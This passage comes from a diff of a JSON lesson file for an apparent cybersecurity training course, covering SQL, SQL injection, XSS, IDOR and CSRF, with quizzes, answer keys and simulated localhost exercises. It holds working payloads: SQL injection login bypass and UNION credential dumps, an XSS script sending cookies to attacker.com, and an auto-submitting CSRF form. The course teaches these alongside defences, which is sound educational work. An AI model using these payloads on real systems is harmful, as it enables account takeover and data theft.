-          "Syntax: `curl -d \"item=sword&qty=-100\" http://localhost:8080/cart/add`",
-          "Explanation: Tests if backend validates integers."
-        ]
-      }
-    ],
-    "explainResult": "The `curl` command transmitted an unconstrained POST parameter directly to the web service, exposing the absence of server-side data sanitization.",
-    "securityConnection": "Auditing input fields is the starting point for discovering SQL injection, Cross-Site Scripting, Command Injection, and Path Traversal. In the following rooms, you will examine each of these flaws in practical detail.",
-    "completion": {
-      "learned": [
-        "The three-tier web application architecture",
-        "The golden rule: Never trust client-side user input",
-        "Input validation vs context-aware output encoding",
-        "The structure and significance of the OWASP Top 10"
-      ],
-      "practiced": [
-        "curl -d \"item=sword&qty=-100\"",
-        "Bypassing client-side controls",
-        "Mapping vulnerabilities to OWASP categories"
-      ]
-    },
-    "nextRoomId": "room-24"
-  },
-  {
-    "id": "room-24",
-    "stage": 6,
-    "stageTitle": "Stage 6 — Web Security",
-    "title": "SQL & Databases for Security Analysts",
-    "difficulty": "Foundation",
-    "difficultyBadge": "🔵 Foundation",
-    "estimatedTime": "25 min",
-    "prerequisites": "Room 23 (Web Security Fundamentals)",
-    "whyAreYouHere": "Before you can exploit or defend against SQL Injection (SQLi), you must understand the language that databases speak: **SQL (Structured Query Language)**. Databases store the modern world's most valuable treasures — passwords, personal identities, credit card tokens, and business transactions. In this room, you will learn how databases structure data into tables, rows, and columns, and how queries are constructed using `SELECT`, `WHERE`, `AND`, `OR`, and `UNION`.",
-    "objectives": [
-      "Understand Relational Databases (RDBMS): Tables, Columns, Rows, and Primary Keys",
-      "Master core SQL query syntax: `SELECT ... FROM ... WHERE ...`",
-      "Understand boolean logic in SQL: `AND`, `OR`, and tautologies (`1=1`)",
-      "Learn how `UNION` combines results from multiple database tables",
-      "Execute SQL queries inside the interactive database shell"
-    ],
-    "vocabulary": [
-      {
-        "term": "RDBMS",
-        "definition": "Relational Database Management System: software (like PostgreSQL, MySQL, SQLite) that stores data in structured tables linked by relationships."
-      },
-      {
-        "term": "SQL (Structured Query Language)",
-        "definition": "The standard domain-specific language used for querying, manipulating, and managing relational databases."
-      },
-      {
-        "term": "SELECT",
-        "definition": "The SQL statement used to retrieve data records from one or more tables."
-      },
-      {
-        "term": "WHERE Clause",
-        "definition": "A SQL clause used to filter query results to only rows that satisfy a specified boolean condition."
-      },
-      {
-        "term": "Tautology",
-        "definition": "A mathematical statement that is always true under all conditions (e.g. `'1'='1'` or `TRUE`)."
-      },
-      {
-        "term": "UNION Operator",
-        "definition": "A SQL operator used to combine the result sets of two or more SELECT statements into a single unified result."
-      }
-    ],
-    "lessons": [
-      {
-        "title": "1. The Architecture of a Database Table",
-        "content": "Inside a database, information is structured like an Excel spreadsheet:\n**Table: `users`**\n```text\nid | username | email              | role\n 1 | admin    | admin@corp.local   | administrator\n 2 | alice    | alice@gmail.com    | customer\n 3 | bob      | bob@outlook.com    | customer\n```\nTo fetch only the admin user:\n```sql\nSELECT username, email FROM users WHERE role = 'administrator';\n```"
-      },
-      {
-        "title": "2. The Danger of Boolean OR",
-        "content": "In SQL, the `AND` operator requires *both* conditions to be true:\n`WHERE username = 'alice' AND password = 'password123'`\n\nThe `OR` operator only requires *one* condition to be true!\nIf an expression evaluates to:\n`WHERE username = 'admin' OR 1=1`\nBecause `1=1` is always mathematically true, the database returns records regardless of what was on the other side! This simple logic is the heart of authentication bypass."
-      }
-    ],
-    "seeExamples": [
-      {
-        "title": "The UNION Query Requirement",
-        "codeOrDiagram": "SELECT id, name, price FROM products WHERE category = 'books'\nUNION\nSELECT id, username, password FROM users;",
-        "explanation": "The `UNION` operator allows attackers to extract data from completely different tables, provided both queries return the same number of columns with compatible data types."
-      }
-    ],
-    "tryInteractive": {
-      "type": "terminal",
-      "prompt": "Query the lab SQLite database to select all usernames and roles from the `users` table: `sqlite3 db.sqlite \"SELECT id, username, role FROM users;\"`:",
-      "initialCommand": "",
-      "expectedCommand": "sqlite3 db.sqlite \"SELECT id, username, role FROM users;\"",
-      "simulatedOutput": "1|admin|administrator\n2|developer|staff\n3|cadet|student\n[+] Success! Queried 3 records from SQLite database.",
-      "explanation": "Standard SQL queries extract specific columns from designated tables using the `SELECT` statement."
-    },
-    "questions": [
-      {
-        "id": "r24-q1",
-        "type": "multiple-choice",
-        "question": "In the SQL query `SELECT * FROM accounts WHERE id = 5 OR 1=1;`, what will the database return?",
-        "options": [
-          "Only account ID 5",
-          "An error, because 1=1 is invalid syntax",
-          "All records from the accounts table, because the condition `1=1` is always true for every row",
-          "Nothing, because the query has no password"
-        ],
-        "correctIndex": 2,
-        "explanation": "Because `OR 1=1` is a tautology (always true), the WHERE condition evaluates to TRUE for every single row in the table, returning all records."
-      },
-      {
-        "id": "r24-q2",
-        "type": "multiple-choice",
-        "question": "What technical condition must be satisfied to successfully use the SQL `UNION` operator between two `SELECT` queries?",
-        "options": [
-          "Both queries must select from the same table",
-          "Both SELECT statements must return the exact same number of columns with compatible data types",
-          "Both queries must be written in uppercase",
-          "The database must be running Microsoft Access"
-        ],
-        "correctIndex": 1,
-        "explanation": "A SQL `UNION` requires both queries to have identical column counts and matching or compatible data types in each position."
-      }
-    ],
-    "tasks": [
-      {
-        "title": "Task 1: Execute SQL Query",
-        "instruction": "Run `sqlite3 db.sqlite \"SELECT id, username, role FROM users;\"` to inspect table records.",
-        "hints": [
-          "Concept: Query SQLite table.",
-          "Direction: Use the sqlite3 CLI with SQL statement.",
-          "Tool: `sqlite3`",
-          "Syntax: `sqlite3 db.sqlite \"SELECT id, username, role FROM users;\"`",
-          "Explanation: Returns table rows."
-        ]
-      }
-    ],
-    "explainResult": "The SQLite engine compiled the query bytecode, executed an index scan over the `users` B-Tree table, and formatted matching column tuples.",
-    "securityConnection": "SQL fluency is essential for discovering and exploiting SQL injection. When an application concatenates untrusted user input directly into a SQL query string, attackers can inject SQL syntax to hijack the query logic.",
-    "completion": {
-      "learned": [
-        "Relational database structure (Tables, Columns, Rows, Primary Keys)",
-        "Writing SELECT queries with WHERE filtering",
-        "How boolean AND and OR logic operates inside databases",
-        "The requirements and mechanism of the UNION operator"
-      ],
-      "practiced": [
-        "sqlite3 db.sqlite \"SELECT ...\"",
-        "Querying database records",
-        "Analyzing SQL boolean expressions"
-      ]
-    },
-    "nextRoomId": "room-25"
-  },
-  {
-    "id": "room-25",
-    "stage": 6,
-    "stageTitle": "Stage 6 — Web Security",
-    "title": "SQL Injection: Detection & Exploitation",
-    "difficulty": "Intermediate",
-    "difficultyBadge": "🟣 Intermediate",
-    "estimatedTime": "40 min",
-    "prerequisites": "Room 24 (SQL & Databases)",
-    "whyAreYouHere": "SQL Injection (SQLi) is one of the most devastating vulnerabilities in computer history. It occurs when an application takes user input (such as a username or search term) and glues it directly into a database query string without sanitization. An attacker can break out of the data context, inject their own SQL commands, bypass authentication, and dump the entire database. In this room, you will learn how SQLi works and how parameterized queries prevent it.",
-    "objectives": [
-      "Understand the root cause of SQL Injection: mixing code and data",
-      "Master the classic Authentication Bypass payload: `' OR '1'='1`",
-      "Learn UNION-based data extraction to dump sensitive tables",
-      "Understand Blind SQL Injection (Boolean-based and Time-based)",
-      "Learn how Parameterized Queries (Prepared Statements) completely eradicate SQLi"
-    ],
-    "vocabulary": [
-      {
-        "term": "SQL Injection (SQLi)",
-        "definition": "A web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database."
-      },
-      {
-        "term": "Authentication Bypass",
-        "definition": "Exploiting SQL injection in a login form to authenticate as an administrator without providing a valid password."
-      },
-      {
-        "term": "UNION-Based SQLi",
-        "definition": "Using the SQL UNION operator to append the results of an attacker-crafted query to the original query's response."
-      },
-      {
-        "term": "Blind SQLi",
-        "definition": "A form of SQLi where the database does not return data or errors on the screen, requiring the attacker to infer data using true/false conditions or time delays."
-      },
-      {
-        "term": "Parameterized Query (Prepared Statement)",
-        "definition": "A database defense pattern where SQL code is pre-compiled and user input is treated strictly as literal data, never as executable code."
-      }
-    ],
-    "lessons": [
-      {
-        "title": "1. The Vulnerable Code: Mixing Code with Data",
-        "content": "Consider this vulnerable backend PHP/Python code:\n```python\n# DANGEROUS STRING CONCATENATION!\nquery = \"SELECT * FROM users WHERE user = '\" + input_user + \"' AND pass = '\" + input_pass + \"'\"\n```\nIf a regular user enters `cadet`, the query is:\n`SELECT * FROM users WHERE user = 'cadet' AND pass = '123'`\n\nNow look what happens if an attacker enters this as their username:\n`admin' OR '1'='1`\nThe resulting SQL becomes:\n`SELECT * FROM users WHERE user = 'admin' OR '1'='1' AND pass = ''`\nBecause `'1'='1'` is true, the database logs the attacker in as **admin** without checking the password at all!"
-      },
-      {
-        "title": "2. The True Remediation: Parameterized Queries",
-        "content": "You cannot fix SQL injection with simple regex filters or replacing single quotes. The **only** complete fix is **Prepared Statements**:\n```python\n# SECURE: Code and Data are strictly separated!\ncursor.execute(\"SELECT * FROM users WHERE user = %s AND pass = %s\", (input_user, input_pass))\n```\nThe database engine compiles the SQL command structure *before* looking at the user parameters. Even if the user submits `' OR '1'='1`, the database treats it as literal string characters, not executable code!"
-      }
-    ],
-    "seeExamples": [
-      {
-        "title": "UNION-Based Extraction Flow",
-        "codeOrDiagram": "Original query:\nSELECT name, description, price FROM products WHERE category = 'gear'\n\nInjected payload in category:\ngear' UNION SELECT 1, username || ':' || password, 3 FROM users--\n\nDatabase returns product rows followed by user credentials!",
-        "explanation": "The `--` characters in SQL tell the database to ignore the rest of the original query as a comment, preventing syntax errors."
-      }
-    ],
-    "tryInteractive": {
-      "type": "terminal",
-      "prompt": "Simulate a vulnerable SQL injection login bypass against our lab API using curl: `curl -d \"username=admin' OR '1'='1--&password=x\" http://localhost:8080/api/login`:",
-      "initialCommand": "",
-      "expectedCommand": "curl -d \"username=admin' OR '1'='1--&password=x\" http://localhost:8080/api/login",
-      "simulatedOutput": "HTTP/1.1 200 OK\n{\"auth\":true,\"role\":\"administrator\",\"token\":\"flag{sql_injection_bypass_master}\"}\n[+] Success! Authentication bypassed. SQL logic evaluated to TRUE.",
-      "explanation": "The injected `' OR '1'='1--` forced the SQL query WHERE clause to evaluate to TRUE, returning the admin account."
-    },
-    "questions": [
-      {
-        "id": "r25-q1",
-        "type": "multiple-choice",
-        "question": "What is the single most effective and industry-recommended defense for completely eliminating SQL injection vulnerabilities in software development?",
-        "options": [
-          "Deploying a client-side JavaScript regex filter",
-          "Using Parameterized Queries (Prepared Statements) with bound variables",
-          "Switching the database port from 3306 to 3307",
-          "Base64-encoding all passwords before sending them to the database"
-        ],
-        "correctIndex": 1,
-        "explanation": "Parameterized queries separate the query structure from the user data, guaranteeing that user input is never interpreted as executable SQL syntax."
-      },
-      {
-        "id": "r25-q2",
-        "type": "multiple-choice",
-        "question": "In SQL syntax, what is the purpose of appending `--` (or `#` in MySQL) at the end of a SQL injection payload?",
-        "options": [
-          "It forces the database to restart",
-          "It comments out the remainder of the original developer's SQL query, preventing syntax errors from trailing quotes",
-          "It automatically encrypts the response",
-          "It downloads the database to the desktop"
-        ],
-        "correctIndex": 1,
-        "explanation": "`--` is a SQL comment symbol. Everything following it is ignored by the parser, neutralizing remaining syntax."
-      }
-    ],
-    "tasks": [
-      {
-        "title": "Task 1: Execute SQLi Auth Bypass",
-        "instruction": "Run `curl -d \"username=admin' OR '1'='1--&password=x\" http://localhost:8080/api/login` to bypass authentication.",
-        "hints": [
-          "Concept: Authentication bypass via boolean injection.",
-          "Direction: Submit payload in username parameter.",
-          "Tool: `curl`",
-          "Syntax: `curl -d \"username=admin' OR '1'='1--&password=x\" http://localhost:8080/api/login`",
-          "Explanation: Bypasses password verification."
-        ]
-      }
-    ],
-    "explainResult": "The backend concatenated the payload directly into the SQL string, modifying the syntax tree such that `1=1` satisfied the WHERE clause.",
-    "securityConnection": "SQL injection continues to be responsible for the largest data breaches in corporate history. Security testers test every input field, URL parameter, HTTP header, and cookie for SQL injection indicators.",
-    "practicalRoomLink": {
-      "label": "Ready for hands-on practice?",
-      "buttonText": "Open Practical SQL Injection Room",
-      "url": "labs.html?lab=sqli"
-    },
-    "completion": {
-      "learned": [
-        "The root architectural cause of SQL injection",
-        "Crafting boolean authentication bypass payloads (' OR '1'='1)",
-        "The role of SQL comments (--) in neutralizing syntax errors",
-        "Why Parameterized Queries (Prepared Statements) are the only complete defense"
-      ],
-      "practiced": [
-        "curl -d \"username=admin' OR '1'='1--&password=x\"",
-        "Bypassing authentication gates",
-        "Analyzing SQL injection vulnerabilities"
-      ]
-    },
-    "nextRoomId": "room-26"
-  },
-  {
-    "id": "room-26",
-    "stage": 6,
-    "stageTitle": "Stage 6 — Web Security",
-    "title": "Cross-Site Scripting (XSS)",
-    "difficulty": "Intermediate",
-    "difficultyBadge": "🟣 Intermediate",
-    "estimatedTime": "40 min",
-    "prerequisites": "Room 13 (Cookies & Sessions) & Room 23 (Web Security Fundamentals)",
-    "whyAreYouHere": "In SQL injection, an attacker targets the backend database server. In **Cross-Site Scripting (XSS)**, the attacker targets the other end: the **victim's web browser**! XSS occurs when a web application takes untrusted input and includes it in a web page without proper escaping or encoding. When another user views that page, their browser executes the attacker's JavaScript code. In this room, you will learn the three types of XSS: Reflected, Stored, and DOM-based, and how to defend against them.",
-    "objectives": [
-      "Understand how browsers execute JavaScript within the Document Object Model (DOM)",
-      "Learn the three varieties of XSS: Reflected XSS, Stored XSS, and DOM-based XSS",
-      "Understand the severe impact of XSS: stealing session cookies, logging keystrokes, and defacing websites",
-      "Learn how Context-Aware Output Encoding neutralizes malicious HTML tags",
-      "Understand Content Security Policy (CSP) as a defense-in-depth barrier"
-    ],
-    "vocabulary": [
-      {
-        "term": "XSS (Cross-Site Scripting)",
-        "definition": "A client-side code injection vulnerability where malicious JavaScript is injected into trusted websites."
-      },
-      {
-        "term": "Stored XSS (Persistent)",
-        "definition": "The most dangerous XSS type, where the malicious script is permanently stored in the database (e.g. in a comment or profile) and executed by every visitor."
-      },
-      {
-        "term": "Reflected XSS (Non-Persistent)",
-        "definition": "XSS where the malicious script is delivered in a URL parameter and immediately reflected back in the server's immediate HTTP response."
-      },
-      {
-        "term": "DOM-Based XSS",
-        "definition": "XSS that occurs entirely within the client-side JavaScript code without the payload ever reaching the backend web server."
-      },
-      {
-        "term": "Context-Aware Output Encoding",
-        "definition": "Converting characters with special meaning in HTML (like `<` to `&lt;` and `>` to `&gt;`) so the browser renders them as harmless text."
-      }
-    ],
-    "lessons": [
-      {
-        "title": "1. The Three Flavors of XSS",
-        "content": "• **Reflected XSS**: Attacker sends a phishing link: `https://bank.com/search?q=<script>fetch('http://attacker.com/?c='+document.cookie)</script>`. When the victim clicks, the bank's search page reflects the query into HTML, running the script.\n• **Stored XSS**: Attacker posts a comment on a forum: `<script>stealData()</script>`. The script is saved to the database. Every user who loads that forum post executes the script!\n• **DOM XSS**: Client-side JavaScript reads `location.hash` and inserts it into the page using `innerHTML` without server involvement."
-      },
-      {
-        "title": "2. The Defense: Output Encoding & CSP",
-        "content": "To fix XSS, browsers must know that user input is text, not executable code:\n• If user enters: `<script>alert(1)</script>`\n• The server must encode it as: `&lt;script&gt;alert(1)&lt;/script&gt;`\nThe browser renders the literal text on the screen, but refuses to execute it as a script tag!\nAdditionally, **Content Security Policy (CSP)** headers restrict where scripts can be loaded from."
-      }
-    ],
-    "seeExamples": [
-      {
-        "title": "Vulnerable HTML vs Encoded HTML",
-        "codeOrDiagram": "<!-- VULNERABLE: Direct rendering -->\n<div>Welcome back, <script>alert(document.cookie)</script></div>\n\n<!-- SECURE: Context-Aware Output Encoded -->\n<div>Welcome back, &lt;script&gt;alert(document.cookie)&lt;/script&gt;</div>",
-        "explanation": "Encoding `<` into `&lt;` changes the character from an HTML syntax delimiter into a harmless text glyph."
-      }
-    ],
-    "tryInteractive": {
-      "type": "terminal",
-      "prompt": "Simulate testing a search parameter for reflected XSS using curl: `curl -s \"http://localhost:8080/search?q=<script>alert('xss')</script>\" | grep -o \"<script>.*</script>\"`:",
-      "initialCommand": "",
-      "expectedCommand": "curl -s \"http://localhost:8080/search?q=<script>alert('xss')</script>\" | grep -o \"<script>.*</script>\"",
-      "simulatedOutput": "<script>alert('xss')</script>\n[+] Alert: Raw script tags reflected without HTML entity encoding! Reflected XSS verified.",
-      "explanation": "Because the raw `<script>` tags were reflected unencoded in the HTTP response, a browser would execute the payload."
-    },
-    "questions": [
-      {
-        "id": "r26-q1",
-        "type": "multiple-choice",
-        "question": "An attacker posts a review on a product page containing malicious JavaScript. Two days later, 5,000 customers view the product and their browsers execute the script. Which type of XSS is this?",
-        "options": [
-          "Reflected XSS",
-          "Stored XSS (Persistent XSS)",
-          "SQL Injection",
-          "ARP Poisoning"
-        ],
-        "correctIndex": 1,
-        "explanation": "Because the payload was stored in the database and executed by future visitors, this is Stored (Persistent) XSS."
-      },
-      {
-        "id": "r26-q2",
-        "type": "multiple-choice",
-        "question": "If an application sets the `HttpOnly` flag on its session cookies, does this eliminate all danger from XSS vulnerabilities?",
-        "options": [
-          "Yes, XSS can do nothing without cookies",
-          "No; while it prevents JavaScript from reading `document.cookie`, XSS can still log keystrokes, perform actions on behalf of the user, rewrite the page, and redirect users to phishing sites",
-          "Yes, because HttpOnly disables JavaScript in the browser",
-          "No, because HttpOnly only works on Android"
-        ],
-        "correctIndex": 1,
-        "explanation": "HttpOnly protects the session cookie from direct theft, but an attacker with XSS can still force the browser to perform unauthorized transactions (like transferring funds)."
-      }
-    ],
-    "tasks": [
-      {
-        "title": "Task 1: Detect Reflected XSS Reflection",
-        "instruction": "Execute `curl -s \"http://localhost:8080/search?q=<script>alert('xss')</script>\" | grep -o \"<script>.*</script>\"` to test reflection.",
-        "hints": [
-          "Concept: Probe input reflection in HTTP response.",
-          "Direction: Send script tags in search query.",
-          "Tool: `curl` and `grep`",
-          "Syntax: Run the complete curl pipeline.",
-          "Explanation: Confirms unencoded reflection."
-        ]
-      }
-    ],
-    "explainResult": "The application echoed the `q` query string parameter directly into the response HTML body without calling `htmlspecialchars()` or HTML entity encoding.",
-    "securityConnection": "XSS is frequently used by cyber criminals to deploy 'Virtual Credit Card Skimmers' (Magecart attacks) on checkout pages, stealing credit card numbers in real-time as victims type them into form fields.",
-    "practicalRoomLink": {
-      "label": "Ready for hands-on practice?",
-      "buttonText": "Open Practical Cross-Site Scripting Lab",
-      "url": "labs.html?lab=xss"
-    },
-    "completion": {
-      "learned": [
-        "How browsers execute injected JavaScript via XSS",
-        "The differences between Reflected, Stored, and DOM-based XSS",
-        "The security impact of client-side execution",
-        "Defenses: Context-aware output encoding, CSP, and HttpOnly cookies"
-      ],
-      "practiced": [
-        "curl -s \"http://localhost:8080/search?q=...\"",
-        "Verifying HTML reflection",
-        "Evaluating XSS mitigation techniques"
-      ]
-    },
-    "nextRoomId": "room-27"
-  },
-  {
-    "id": "room-27",
-    "stage": 6,
-    "stageTitle": "Stage 6 — Web Security",
-    "title": "Access Control & IDOR",
-    "difficulty": "Intermediate",
-    "difficultyBadge": "🟣 Intermediate",
-    "estimatedTime": "35 min",
-    "prerequisites": "Room 16 (Authentication & Authorization) & Room 23 (Web Security Fundamentals)",
-    "whyAreYouHere": "In 2018, a security researcher discovered that by changing the number in the URL of a major airline app from `invoice/1001` to `invoice/1002`, they could view any passenger's boarding pass, passport details, and travel itinerary! This is **Insecure Direct Object Reference (IDOR)**, a subset of Broken Access Control (the #1 flaw on the OWASP Top 10). In this room, you will learn how IDOR occurs and how to implement proper authorization checks.",
-    "objectives": [
-      "Understand what Direct Object References are (e.g. database primary keys in URLs)",
-      "Learn the difference between Horizontal Privilege Escalation and Vertical Privilege Escalation",
-      "Understand why relying on parameter obscurity or client-side checks fails",
-      "Learn how to audit REST APIs for IDOR vulnerabilities",
-      "Implement server-side authorization validation to prevent unauthorized access"
-    ],
-    "vocabulary": [
-      {
-        "term": "IDOR (Insecure Direct Object Reference)",
-        "definition": "A vulnerability where an application exposes a reference to an internal implementation object (such as a database ID or filename) without validating whether the requesting user has authorization."
-      },
-      {
-        "term": "Horizontal Privilege Escalation",
-        "definition": "When an attacker accesses data or functions belonging to another user who holds the exact same privilege tier (e.g. User A views User B's profile)."
-      },
-      {
-        "term": "Vertical Privilege Escalation",
-        "definition": "When a standard low-privilege user accesses functionality or data reserved for higher-privilege administrative tiers."
-      },
-      {
-        "term": "GUID / UUID",
-        "definition": "Globally Unique Identifier: a 128-bit random number (e.g. `f47ac10b-58cc-4372-a567-0e02b2c3d479`) that prevents sequential enumeration of database records."
-      }
-    ],
-    "lessons": [
-      {
-        "title": "1. The Anatomy of an IDOR Flaw",
-        "content": "When you view your medical record, the web app requests:\n`GET /api/records?patient_id=4092 HTTP/1.1`\nCookie: session=Alice\n\nWhat happens if Alice changes the number to `4093`?\n• **Vulnerable Application**: Looks up `patient_id = 4093` and returns Bob's medical file! The code checked that Alice was logged in, but **never checked if Alice owns record 4093**.\n• **Secure Application**: Checks:\n`WHERE record_id = 4093 AND patient_id = current_session.user_id`\nIf they don't match, return `403 Forbidden`!"
-      },
-      {
-        "title": "2. Horizontal vs Vertical Escalation",
-        "content": "• **Horizontal**: You are User 102. You change the URL to User 103 to read another student's exam score. Both are students.\n• **Vertical**: You are User 102 (student). You change the URL parameter to `role=admin` or access `/admin/delete_user` to execute actions reserved for the university dean!"
-      }
-    ],
-    "seeExamples": [
-      {
-        "title": "Vulnerable vs Secure REST API Endpoint",
-        "codeOrDiagram": "// VULNERABLE: Direct access with no authorization check\napp.get('/api/invoice/:id', (req, res) => {\n  const invoice = db.find({ id: req.params.id });\n  return res.json(invoice); // Anyone who knows the ID gets the invoice!\n});\n\n// SECURE: Strict server-side ownership verification\napp.get('/api/invoice/:id', (req, res) => {\n  const invoice = db.find({ id: req.params.id, userId: req.user.id });\n  if (!invoice) return res.status(403).json({ error: \"Access Denied\" });\n  return res.json(invoice);\n});",
-        "explanation": "The secure implementation binds the query to the authenticated `req.user.id`, preventing cross-account access."
-      }
-    ],
-    "tryInteractive": {
-      "type": "terminal",
-      "prompt": "Simulate an IDOR exploit by requesting user account 100 instead of your own account (102): `curl -s -H \"Cookie: session=cadet_102\" http://localhost:8080/api/users/100`:",
-      "initialCommand": "",
-      "expectedCommand": "curl -s -H \"Cookie: session=cadet_102\" http://localhost:8080/api/users/100",
-      "simulatedOutput": "HTTP/1.1 200 OK\n{\n  \"user_id\": 100,\n  \"name\": \"System Administrator\",\n  \"email\": \"admin@endlessus.in\",\n  \"api_secret\": \"sec_flag_idor_broken_access_992\"\n}\n[+] Success! IDOR confirmed: Cadet user accessed Administrator profile.",
-      "explanation": "The backend verified the session cookie was valid, but failed to ensure cadet_102 had permission to read user_id 100."
-    },
-    "questions": [
-      {
-        "id": "r27-q1",
-        "type": "multiple-choice",
-        "question": "What is the fundamental flaw that enables Insecure Direct Object References (IDOR)?",
-        "options": [
-          "The database is missing an index",
-          "The application exposes an object identifier (like an ID in the URL) but fails to perform server-side authorization checks verifying that the requesting user owns that object",
-          "The website does not use HTTPS",
-          "The user's password was too short"
-        ],
-        "correctIndex": 1,
-        "explanation": "IDOR occurs when an application trusts user-supplied direct object references without server-side access control validation."
-      },
-      {
-        "id": "r27-q2",
-        "type": "multiple-choice",
-        "question": "Which of the following is considered Horizontal Privilege Escalation?",
-        "options": [
-          "A regular customer views another regular customer's order history",
-          "A regular customer upgrades their account to full system administrator",
-          "A hacker gains root access to the underlying Linux server",
-          "A database user drops all tables"
-        ],
-        "correctIndex": 0,
-        "explanation": "Horizontal escalation occurs between peers on the same privilege level (customer accessing another customer's data)."
-      }
-    ],
-    "tasks": [
-      {
-        "title": "Task 1: Exploit IDOR Parameter Manipulation",
-        "instruction": "Use curl with `session=cadet_102` to extract user 100's record.",
-        "hints": [
-          "Concept: Parameter tampering with direct object reference.",
-          "Direction: Send GET to `/api/users/100`.",
-          "Tool: `curl`",
-          "Syntax: `curl -s -H \"Cookie: session=cadet_102\" http://localhost:8080/api/users/100`",
-          "Explanation: Returns admin data."
-        ]
-      }
-    ],
-    "explainResult": "The endpoint directly routed the route parameter `:id` into the query object without comparing it to the session principal.",
-    "securityConnection": "Broken Access Control is currently ranked **#1 on the OWASP Top 10**. Penetration testers systematically map out all integer and GUID parameters in an application to test whether incrementing numbers or swapping IDs exposes data belonging to other tenants.",
-    "practicalRoomLink": {
-      "label": "Ready for hands-on practice?",
-      "buttonText": "Open Practical IDOR Lab",
-      "url": "labs.html?lab=idor"
-    },
-    "completion": {
-      "learned": [
-        "The mechanics of Insecure Direct Object References (IDOR)",
-        "Horizontal vs Vertical Privilege Escalation",
-        "Why GUIDs/UUIDs alone are not a substitute for authorization",
-        "Implementing server-side authorization verification"
-      ],
-      "practiced": [
-        "curl -H \"Cookie: ...\" /api/users/100",
-        "Auditing REST API access controls",
-        "Verifying session ownership bounds"
-      ]
-    },
-    "nextRoomId": "room-28"
-  },
-  {
-    "id": "room-28",
-    "stage": 6,
-    "stageTitle": "Stage 6 — Web Security",
-    "title": "CSRF, Cookies & SameSite Defense",
-    "difficulty": "Intermediate",
-    "difficultyBadge": "🟣 Intermediate",
-    "estimatedTime": "35 min",
-    "prerequisites": "Room 13 (Cookies & Sessions) & Room 23 (Web Security Fundamentals)",
-    "whyAreYouHere": "Imagine you are logged into your online bank. In another browser tab, you visit a recipe blog. Without your knowledge, the recipe blog secretly submits a form in the background to your bank: *Transfer $1,000 to Attacker*. Because your browser automatically includes your valid session cookies with every request to the bank, the bank processes the transfer! This is **Cross-Site Request Forgery (CSRF)**. In this room, you will learn how CSRF works and how Anti-CSRF tokens and SameSite cookies stop it.",
-    "objectives": [
-      "Understand Ambient Authority and why browsers automatically send session cookies",
-      "Learn the mechanics of Cross-Site Request Forgery (CSRF)",
-      "Understand why GET requests should NEVER alter server state",
-      "Master the Anti-CSRF Token defense mechanism (Synchronizer Token Pattern)",
-      "Understand the `SameSite` cookie attribute values: `Strict`, `Lax`, and `None`"
-    ],
-    "vocabulary": [
-      {
-        "term": "CSRF (Cross-Site Request Forgery)",
-        "definition": "An attack that forces an authenticated user's browser to execute unwanted actions on a trusted web application without their consent."
-      },
-      {
-        "term": "Ambient Authority",
-        "definition": "A security design where credentials (like cookies or IP addresses) are automatically attached by the system without explicit user intention."
-      },
-      {
-        "term": "Anti-CSRF Token",
-        "definition": "A unique, unpredictable, secret value generated by the server and associated with the user's current session, verified on state-changing requests."
-      },
-      {
-        "term": "SameSite=Strict",
-        "definition": "Cookie attribute that blocks the cookie from being sent in all cross-site browsing contexts, even following regular external links."
-      },
-      {
-        "term": "SameSite=Lax",
-        "definition": "Cookie attribute that allows cookies on top-level safe GET navigations (e.g. clicking a link), but blocks them on cross-site POSTs or images."
-      }
-    ],
-    "lessons": [
-      {
-        "title": "1. The Recipe Blog Attack",
-        "content": "How a CSRF exploit works:\n1. Victim logs into `mybank.com`. The browser stores `Cookie: session=ValidSession123`.\n2. Victim opens `evil-recipe.com` in another tab.\n3. The evil page contains hidden HTML that auto-submits on load:\n```html\n<form action=\"https://mybank.com/transfer\" method=\"POST\" id=\"csrfForm\">\n  <input type=\"hidden\" name=\"to\" value=\"AttackerAccount\">\n  <input type=\"hidden\" name=\"amount\" value=\"1000\">\n</form>\n<script>document.getElementById('csrfForm').submit();</script>\n```\n4. Because the request is heading to `mybank.com`, the victim's browser automatically attaches `session=ValidSession123`!\nThe bank cannot tell whether the victim clicked 'Transfer' or if the recipe blog forced the click."
-      },
-      {
-        "title": "2. The Modern Defense: Anti-CSRF Tokens & SameSite",
-        "content": "• **Anti-CSRF Tokens**: The bank generates a random secret token (e.g. `csrf_token=9a8f2...`) and embeds it inside the real transfer form. The evil recipe blog cannot read this token because browsers enforce the Same-Origin Policy (SOP). When the form submits without the valid token, the server rejects it!\n• **SameSite=Lax/Strict Cookies**: Modern browsers do not attach SameSite cookies to cross-origin form submissions, stopping the attack at the browser layer!"
-      }
-    ],
-    "seeExamples": [
-      {
-        "title": "Anti-CSRF Token Validation Flow",
-        "codeOrDiagram": "[ Genuine Bank Form ]\n<form action=\"/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"csrf_token\" value=\"secret_random_token_xyz\">\n  <button type=\"submit\">Transfer</button>\n</form>\n\n[ Server Verification ]\nif (req.body.csrf_token !== session.expected_token) {\n  return res.status(403).send(\"CSRF Attack Detected!\");\n}",
-        "explanation": "Because an external site cannot read the victim's CSRF token, any forged request will be missing the valid token."
-      }
-    ],
-    "tryInteractive": {
-      "type": "terminal",
-      "prompt": "Simulate submitting a state-changing money transfer request without an Anti-CSRF token using curl: `curl -d \"to=attacker&amount=500\" http://localhost:8080/api/transfer`:",
-      "initialCommand": "",
-      "expectedCommand": "curl -d \"to=attacker&amount=500\" http://localhost:8080/api/transfer",
-      "simulatedOutput": "HTTP/1.1 403 Forbidden\n{\"error\":\"CSRF_TOKEN_MISSING\",\"message\":\"State-changing operation rejected. Missing Anti-CSRF token.\"}\n[+] Success! The server successfully detected and blocked the forged request.",
-      "explanation": "The server inspected the payload, found no matching Anti-CSRF token, and safely rejected the transaction with HTTP 403."
-    },
-    "questions": [
-      {
-        "id": "r28-q1",
-        "type": "multiple-choice",
-        "question": "Why does an Anti-CSRF token prevent external third-party websites from executing forged requests against a victim's bank?",
-        "options": [
-          "Because third-party websites cannot use HTTPS",
-          "Because the Same-Origin Policy prevents the external attacker's website from reading the random secret token from the victim's bank page",
-          "Because Anti-CSRF tokens reboot the server every 5 seconds",
-          "Because tokens can only be typed on physical keyboards"
-        ],
-        "correctIndex": 1,
-        "explanation": "Due to the browser's Same-Origin Policy, an external website cannot read content from another origin, meaning it cannot know or guess the valid token."
-      },
-      {
-        "id": "r28-q2",
-        "type": "multiple-choice",
-        "question": "Which cookie attribute ensures that a session cookie will NOT be sent on cross-site POST form submissions, defending against CSRF?",
-        "options": [
